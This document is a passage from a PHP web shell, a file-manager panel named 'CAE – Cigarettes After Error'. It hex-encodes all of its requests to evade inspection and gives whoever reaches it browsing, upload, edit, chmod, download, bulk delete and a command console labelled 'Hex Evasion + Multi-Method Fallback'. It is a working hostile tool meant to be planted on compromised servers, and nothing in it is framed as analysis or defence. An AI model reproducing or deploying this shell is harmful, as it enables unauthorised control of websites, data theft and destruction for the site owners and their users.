                if (!res.ok) {
                    throw new Error(data.message || 'Server error');
                }

                return data;
            } catch (err) {
                if (statusSpan) {
                    statusSpan.textContent = 'Error: ' + err.message;
                    statusSpan.style.color = 'var(--danger)';
                } else {
                    alert('Request failed: ' + err.message);
                }
                throw err;
            }
        }

        async function doNavigateHex(event) {
            event.preventDefault();
            const path = event.target.elements['goto_path'].value.trim();
            if (!path) return;
            await sendHexPayload({
                action: 'goto',
                goto_hex: stringToHex(path)
            });
            location.reload();
        }

        async function doUploadFileHex(btn) {
            const fileInput = document.getElementById('upload_files');
            const modeInput = document.getElementById('upload_mode');
            const statusSpan = document.getElementById('upload_status');
            if (!fileInput.files.length) {
                statusSpan.textContent = "No file selected"; statusSpan.style.color = "var(--danger)"; return;
            }
            btn.disabled = true;
            const file = fileInput.files[0];
            const mode = modeInput.value;
            statusSpan.textContent = "Converting " + file.name + " to hex payload, please wait...";
            statusSpan.style.color = "var(--accent)";

            const reader = new FileReader();
            reader.onload = async function(e) {
                statusSpan.textContent = "Uploading payload...";
                try {
                    const data = await sendHexPayload({
                        action: 'upload_hex',
                        name_hex: stringToHex(file.name),
                        data_hex: bufferToHex(e.target.result),
                        mode: mode
                    }, statusSpan);
                    statusSpan.textContent = data.message;
                    statusSpan.style.color = 'var(--success)';
                    setTimeout(() => location.reload(), 1000);
                } catch(err) {}
            };
            reader.readAsArrayBuffer(file);
        }

        async function doCreateItemHex(event, type) {
            event.preventDefault();
            const inputName = type === 'file' ? 'mk_file' : 'mk_folder';
            const name = event.target.elements[inputName].value.trim();
            if (!name) return;
            await sendHexPayload({
                action: type === 'file' ? 'create_file' : 'create_folder',
                name_hex: stringToHex(name)
            });
            location.reload();
        }

        async function openEditorHex(itemName) {
            try {
                const data = await sendHexPayload({
                    action: 'get_file_content',
                    file_hex: stringToHex(itemName)
                });
                const decodedContent = hexToUtf8(data.content_hex);
                
                document.getElementById('editFileName').value = itemName;
                document.getElementById('editTitleName').textContent = itemName;
                document.getElementById('editContentArea').value = decodedContent;
                document.getElementById('editorCard').style.display = 'block';
                document.getElementById('viewerCard').style.display = 'none';
                window.scrollTo({ top: document.getElementById('editorCard').offsetTop, behavior: 'smooth' });
            } catch(e) {}
        }

        async function doSaveEditHex(event) {
            event.preventDefault();
            const fileName = document.getElementById('editFileName').value;
            const content = document.getElementById('editContentArea').value;
            await sendHexPayload({
                action: 'edit_file',
                file_hex: stringToHex(fileName),
                content_hex: stringToHex(content)
            });
            alert('File saved successfully!');
            location.reload();
        }

        async function openViewerHex(itemName) {
            try {
                const data = await sendHexPayload({
                    action: 'get_file_content',
                    file_hex: stringToHex(itemName)
                });
                const decodedContent = hexToUtf8(data.content_hex);
                
                document.getElementById('viewTitleName').textContent = itemName;
                document.getElementById('viewContentArea').value = decodedContent;
                document.getElementById('viewerCard').style.display = 'block';
                document.getElementById('editorCard').style.display = 'none';
                window.scrollTo({ top: document.getElementById('viewerCard').offsetTop, behavior: 'smooth' });
            } catch(e) {}
        }

        function openRenameInput(itemName) {
            document.getElementById('row-normal-' + itemName).style.display = 'none';
            document.getElementById('row-rename-' + itemName).style.display = 'flex';
        }

        function cancelRenameInput(itemName) {
            document.getElementById('row-rename-' + itemName).style.display = 'none';
            document.getElementById('row-normal-' + itemName).style.display = 'flex';
        }

        async function doRenameHex(itemName) {
            const newName = document.getElementById('rename_input_' + itemName).value.trim();
            if (!newName || newName === itemName) { cancelRenameInput(itemName); return; }
            await sendHexPayload({
                action: 'rename',
                old_hex: stringToHex(itemName),
                new_hex: stringToHex(newName)
            });
            location.reload();
        }

        async function doChmodHex(event) {
            event.preventDefault();
            const itemName = document.getElementById('chmodItem').value;
            const permVal = document.getElementById('chmodOctal').value;
            await sendHexPayload({
                action: 'chmod',
                item_hex: stringToHex(itemName),
                perm_val: permVal
            });
            location.reload();
        }

        async function doDeleteHex(itemName) {
            if (!confirm(`Delete ${itemName}?`)) return;
            await sendHexPayload({
                action: 'delete',
                item_hex: stringToHex(itemName)
            });
            location.reload();
        }

        async function doDownloadHex(itemName) {
            try {
                const data = await sendHexPayload({
                    action: 'download_hex',
                    items: [stringToHex(itemName)]
                });
                triggerHexDownload(data.data_hex, data.filename, data.mime);
            } catch(e) {}
        }

        async function doBulkDownloadHex() {
            const checked = document.querySelectorAll('input[name="items[]"]:checked');
            if (checked.length === 0) return;
            const items = Array.from(checked).map(cb => stringToHex(cb.value));
            try {
                const data = await sendHexPayload({
                    action: 'download_hex',
                    items: items
                });
                triggerHexDownload(data.data_hex, data.filename, data.mime);
            } catch(e) {}
        }

        async function doBulkDeleteHex() {
            const checked = document.querySelectorAll('input[name="items[]"]:checked');
            if (checked.length === 0) return;
            if (!confirm('Delete all selected items?')) return;
            const items = Array.from(checked).map(cb => stringToHex(cb.value));
            await sendHexPayload({
                action: 'bulk_delete',
                items: items
            });
            location.reload();
        }

        async function submitConsoleHex(event) {
            event.preventDefault();
            const cmdInput = document.getElementById('exec_cmd_input');
            const rawVal = cmdInput.value;
            if (!rawVal.trim()) return;

            const consoleOutputDiv = document.getElementById('consoleResultOutput');
            consoleOutputDiv.style.display = 'block';
            consoleOutputDiv.textContent = 'Executing...';

            try {
                const data = await sendHexPayload({
                    action: 'console_exec',
                    exec_hex: stringToHex(rawVal)
                });
                consoleOutputDiv.textContent = hexToUtf8(data.output_hex);
            } catch (err) {
                consoleOutputDiv.textContent = 'Error: ' + err.message;
            }
        }

        function triggerHexDownload(hexData, filename, mimeType) {
            let bytes = new Uint8Array(hexData.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
            let blob = new Blob([bytes], { type: mimeType });
            let link = document.createElement('a');
            link.href = window.URL.createObjectURL(blob);
            link.download = filename;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }

        function toggleSelectAll(cb) {
            document.querySelectorAll('input[name="items[]"]').forEach(function(c){ c.checked = cb.checked; });
            updateBulkActions();
        }
        function updateBulkActions() {
            var checked = document.querySelectorAll('input[name="items[]"]:checked');
            var bar = document.getElementById('bulk-actions');
            var count = document.getElementById('selected-count');
            if (checked.length > 0) { bar.style.display = 'flex'; count.textContent = checked.length + ' item(s) selected'; }
            else { bar.style.display = 'none'; }
        }
        function openChmodModal(itemName, octalId) {
            var modal = document.getElementById('chmodModal');
            modal.classList.add('show'); modal.style.display = 'flex';
            document.getElementById('chmodItem').value = itemName;
            updateChmodDisplay(document.getElementById(octalId).value);
        }
        function closeChmodModal() {
            var modal = document.getElementById('chmodModal');
            modal.classList.remove('show'); modal.style.display = 'none';
        }
        function updateChmodDisplay(perms) {
            perms = (perms || '0').toString().slice(-3);
            document.getElementById('chmodOctal').value = perms;
            var binary = (parseInt(perms, 8) || 0).toString(2);
            while (binary.length < 9) { binary = '0' + binary; }
            var ids = ['owner_read','owner_write','owner_execute','group_read','group_write','group_execute','other_read','other_write','other_execute'];
            for (var i = 0; i < 9; i++) { document.getElementById(ids[i]).checked = binary[i] === '1'; }
        }
        function updateChmodFromCheckboxes() {
            var ids = ['owner_read','owner_write','owner_execute','group_read','group_write','group_execute','other_read','other_write','other_execute'];
            var binary = '';
            for (var i = 0; i < 9; i++) { binary += document.getElementById(ids[i]).checked ? '1' : '0'; }
            var octal = parseInt(binary, 2).toString(8);
            while (octal.length < 3) { octal = '0' + octal; }
            document.getElementById('chmodOctal').value = octal;
        }
        function setPresetChmod(p) { updateChmodDisplay(p); }
        window.onclick = function(e) {
            var modal = document.getElementById('chmodModal');
            if (e.target == modal) { closeChmodModal(); }
        };
    </script>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="header-top">
            <div class="logo">
                <span class="logo-text">CAE</span>
                <span class="logo-sub">Cigarettes After Error</span>
            </div>
            <button class="theme-toggle" onclick="document.body.classList.toggle('light')">Dark/Light</button>
        </div>
    </div>

    <?php if ($errorMsg): ?>
        <div class="alert alert-danger">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
            <?= htmlentities($errorMsg) ?>
        </div>
    <?php endif; ?>

    <!-- Navigation -->
    <div class="card" style="margin-bottom: 20px;">
        <div class="card-header">
            <span class="card-title">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
                Navigate
            </span>
        </div>
        <div class="card-body">
            <form onsubmit="doNavigateHex(event)" class="input-group">
                <input type="text" name="goto_path" value="<?= htmlentities($currentDirectory) ?>" placeholder="Enter path..." style="flex: 1;">
                <button class="btn btn-primary" type="submit">Go</button>
            </form>
        </div>
    </div>

    <!-- Upload & Create -->
    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 20px;">
        <div class="card">
            <div class="card-header">
                <span class="card-title">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
                    Hex Payload Upload
                </span>
            </div>
            <div class="card-body">
                <div class="input-group">
                    <select id="upload_mode" style="background: var(--bg); border: 1px solid var(--border); border-radius: 8px; padding: 12px; color: var(--text);">
                        <option value="1">Mode 1 (file_put_contents)</option>
                        <option value="2">Mode 2 (fopen/fwrite)</option>
                        <option value="3">Mode 3 (data:// wrapper)</option>
                    </select>
                    <input type="file" id="upload_files">
                    <button class="btn btn-primary" onclick="doUploadFileHex(this)">Upload</button>
                </div>
                <p style="margin-top: 8px; font-size: 12px; color: var(--text-muted);">Status: <span id="upload_status">No file selected</span></p>
            </div>
        </div>

        <div class="card">
            <div class="card-header">
                <span class="card-title">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 5v14M5 12h14"/></svg>
                    Create New
                </span>
            </div>
            <div class="card-body">
                <form onsubmit="doCreateItemHex(event, 'file')" class="input-group">
                    <input type="text" name="mk_file" placeholder="New file name..." style="flex: 1;">
                    <button class="btn btn-success" type="submit">File</button>
                </form>
                <form onsubmit="doCreateItemHex(event, 'folder')" class="input-group">
                    <input type="text" name="mk_folder" placeholder="New folder name..." style="flex: 1;">
                    <button class="btn btn-success" type="submit">Folder</button>
                </form>
            </div>
        </div>
    </div>

    <!-- Viewer -->
    <div class="card" id="viewerCard" style="margin-bottom: 20px; display: none;">
        <div class="card-header">
            <span class="card-title">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                Viewing: <span id="viewTitleName"></span>
            </span>
            <button type="button" class="btn btn-ghost btn-sm" onclick="document.getElementById('viewerCard').style.display='none';">Close</button>
        </div>
        <div class="card-body">
            <textarea id="viewContentArea" readonly style="min-height: 300px; width: 100%; box-sizing: border-box;"></textarea>
        </div>
    </div>

    <!-- Editor -->
    <div class="card" id="editorCard" style="margin-bottom: 20px; display: none;">
        <div class="card-header">
            <span class="card-title">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
                Editing: <span id="editTitleName"></span>
            </span>
        </div>
        <div class="card-body">
            <form onsubmit="doSaveEditHex(event)">
                <input type="hidden" id="editFileName" value="">
                <textarea id="editContentArea" style="min-height: 400px; width: 100%; box-sizing: border-box;"></textarea>
                <div style="margin-top: 12px; display: flex; gap: 8px;">
                    <button class="btn btn-primary" type="submit">Save Changes</button>
                    <button type="button" class="btn btn-ghost" onclick="document.getElementById('editorCard').style.display='none';">Cancel</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Console -->
    <?php if ($commandAvailable): ?>
    <div class="card" style="margin-bottom: 20px;">
        <div class="card-header">
            <span class="card-title">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
                Console (Hex Evasion + Multi-Method Fallback)
            </span>
        </div>
        <div class="card-body">
            <form id="consoleForm" onsubmit="submitConsoleHex(event)" class="input-group" style="flex: 1;">
                <input type="text" id="exec_cmd_input" placeholder="Enter command..." style="flex: 1;">
                <button class="btn btn-success" type="submit">Execute</button>
            </form>
            <div id="consoleResultOutput" class="console" style="margin-top: 12px; display: none;"></div>
        </div>
    </div>
    <?php endif; ?>

    <!-- Bulk Actions -->
    <div class="bulk-bar" id="bulk-actions">
        <span class="bulk-count" id="selected-count">0 selected</span>
        <button type="button" class="btn btn-ghost" onclick="doBulkDownloadHex()">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
            Download Archive
        </button>
        <button type="button" class="btn btn-danger" onclick="doBulkDeleteHex()">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
            Delete Selected
        </button>
    </div>

    <!-- File Explorer -->
    <div class="card">
        <div class="card-header">
            <span class="card-title">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
                Files
            </span>
            <button type="button" class="btn btn-ghost" onclick="sendHexPayload({action: 'goto', goto_hex: stringToHex('<?= addslashes(dirname($currentDirectory)) ?>')}).then(() => location.reload());"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg> Parent</button>
        </div>
        <table class="file-table">
            <thead>
                <tr>
                    <th style="width: 40px;"><input type="checkbox" onclick="toggleSelectAll(this)"></th>
                    <th>Name</th>
                    <th style="width: 100px;">Type</th>
                    <th style="width: 100px; text-align: right;">Size</th>
                    <th style="width: 150px;">Modified</th>
                    <th style="width: 90px; text-align: center;">Perms</th>
                    <th style="width: 230px; text-align: right;">Actions</th>
                </tr>
            </thead>
            <tbody>
        <?php foreach ($allItems as $item):
            $fullPath = $currentDirectory . DIRECTORY_SEPARATOR . $item;
            $realPath = safeRealPath($fullPath);
            if ($realPath !== false) {
                $isDirectory = @is_dir($realPath);
                $canWrite = @is_writable($realPath);
                $fileSize = $isDirectory ? 0 : @filesize($realPath);
                $fileModTime = @filemtime($realPath);
                $filePerms = @substr(sprintf('%o', @fileperms($realPath)), -4);
            } else {
                $isDirectory = @is_dir($fullPath);
                $canWrite = false; $fileSize = 0; $fileModTime = 0; $filePerms = '????';
            }
            $md5item = md5($item);
            $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
            $iconClass = $isDirectory ? 'folder' : 'file';
            $iconHtml = $isDirectory
                ? '<svg viewBox="0 0 24 24"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2 z"/></svg>'
                : '<svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>';
            if (!$isDirectory && $ext) { $iconHtml .= '<span class="ext">' . strtoupper($ext) . '</span>'; }
        ?>
            <tr>
                <td><input type="checkbox" name="items[]" value="<?= htmlentities($item) ?>" onclick="updateBulkActions()"></td>
                <td>
                    <div id="row-normal-<?= htmlentities($item) ?>" class="file-name-cell">
                        <div class="file-icon <?= $iconClass ?>"><?= $iconHtml ?></div>
                        <?php if ($isDirectory): ?>
                            <a href="#" class="file-name" onclick="sendHexPayload({action: 'goto', goto_hex: stringToHex('<?= addslashes($fullPath) ?>')}).then(() => location.reload()); return false;"><?= htmlentities($item) ?></a>
                        <?php else: ?>
                            <a href="#" class="file-name" onclick="openViewerHex('<?= addslashes($item) ?>'); return false;"><?= htmlentities($item) ?></a>
                        <?php endif; ?>
                    </div>
                    <div id="row-rename-<?= htmlentities($item) ?>" style="display: none; gap: 8px; align-items: center;">
                        <input type="text" id="rename_input_<?= htmlentities($item) ?>" value="<?= htmlentities($item) ?>" style="flex: 1;">
                        <button class="btn btn-primary btn-sm" onclick="doRenameHex('<?= addslashes($item) ?>')">Save</button>
                        <button class="btn btn-ghost btn-sm" onclick="cancelRenameInput('<?= addslashes($item) ?>')">Cancel</button>
                    </div>
                </td>
                <td><span class="file-meta"><?= $isDirectory ? 'Directory' : (getFileExtension($item) ?: 'File') ?></span></td>
                <td style="text-align: right;"><span class="file-meta"><?= $isDirectory ? '&mdash;' : formatFileSize($fileSize) ?></span></td>
                <td><span class="file-meta"><?= date('Y-m-d H:i', $fileModTime) ?></span></td>
                <td style="text-align: center;">
                    <span class="perms <?= $canWrite ? 'writable' : 'readonly' ?>"><?= htmlentities($filePerms) ?></span>
                    <input type="hidden" id="currentPerms_<?= $md5item ?>" value="<?= htmlentities($filePerms) ?>">
                </td>
                <td>
                    <div class="actions">
                        <?php if (!$isDirectory): ?>
                            <button type="button" class="btn btn-ghost btn-sm" onclick="openEditorHex('<?= addslashes($item) ?>')">Edit</button>
                        <?php endif; ?>
                        <button type="button" class="btn btn-ghost btn-sm" onclick="openRenameInput('<?= addslashes($item) ?>')">Rename</button>
                        <button type="button" class="btn btn-ghost btn-sm" onclick="openChmodModal('<?= htmlentities($item) ?>', 'currentPerms_<?= $md5item ?>')">Chmod</button>
                        <button type="button" class="btn btn-ghost btn-sm" onclick="doDownloadHex('<?= addslashes($item) ?>')">DL</button>
                        <button type="button" class="btn btn-danger btn-sm" onclick="doDeleteHex('<?= addslashes($item) ?>')">Del</button>
                    </div>
                </td>
            </tr>
        <?php endforeach; ?>
            </tbody>
        </table>
    </div>
</div>

<div id="chmodModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <span class="modal-title">Change Permissions</span>
            <span class="modal-close" onclick="closeChmodModal()">&times;</span>
        </div>
        <form onsubmit="doChmodHex(event)">
            <input type="hidden" id="chmodItem" value="">
            <div class="chmod-grid">
                <div class="chmod-group">
                    <div class="chmod-group-label">Owner</div>
                    <div class="chmod-checkboxes">
                        <label><input type="checkbox" id="owner_read" onchange="updateChmodFromCheckboxes()"> R</label>
                        <label><input type="checkbox" id="owner_write" onchange="updateChmodFromCheckboxes()"> W</label>
                        <label><input type="checkbox" id="owner_execute" onchange="updateChmodFromCheckboxes()"> X</label>
                    </div>
                </div>
                <div class="chmod-group">
                    <div class="chmod-group-label">Group</div>
                    <div class="chmod-checkboxes">
                        <label><input type="checkbox" id="group_read" onchange="updateChmodFromCheckboxes()"> R</label>
                        <label><input type="checkbox" id="group_write" onchange="updateChmodFromCheckboxes()"> W</label>
                        <label><input type="checkbox" id="group_execute" onchange="updateChmodFromCheckboxes()"> X</label>
                    </div>
                </div>
                <div class="chmod-group">
                    <div class="chmod-group-label">Other</div>
                    <div class="chmod-checkboxes">
                        <label><input type="checkbox" id="other_read" onchange="updateChmodFromCheckboxes()"> R</label>
                        <label><input type="checkbox" id="other_write" onchange="updateChmodFromCheckboxes()"> W</label>
                        <label><input type="checkbox" id="other_execute" onchange="updateChmodFromCheckboxes()"> X</label>
                    </div>
                </div>
            </div>
            <div class="modal-body">
                <div style="margin-bottom: 16px; text-align: center;">
                    <input type="text" id="chmodOctal" maxlength="3" style="width: 70px; text-align: center; font-family: 'JetBrains Mono', monospace;">
                </div>
                <div style="margin-bottom: 15px; display: flex; gap: 8px; flex-wrap: wrap;">
                    <button type="button" class="btn btn-ghost btn-sm" onclick="setPresetChmod('755')">755 (Default)</button>
                    <button type="button" class="btn btn-ghost btn-sm" onclick="setPresetChmod('644')">644 (File)</button>
                    <button type="button" class="btn btn-ghost btn-sm" onclick="setPresetChmod('777')">777 (All)</button>
                </div>
                <div style="display: flex; gap: 8px;">
                    <button type="submit" class="btn btn-primary">Apply Changes</button>
                    <button type="button" class="btn btn-ghost" onclick="closeChmodModal()">Cancel</button>
                </div>
            </div>
        </form>
    </div>
</div>
</body>
</html>
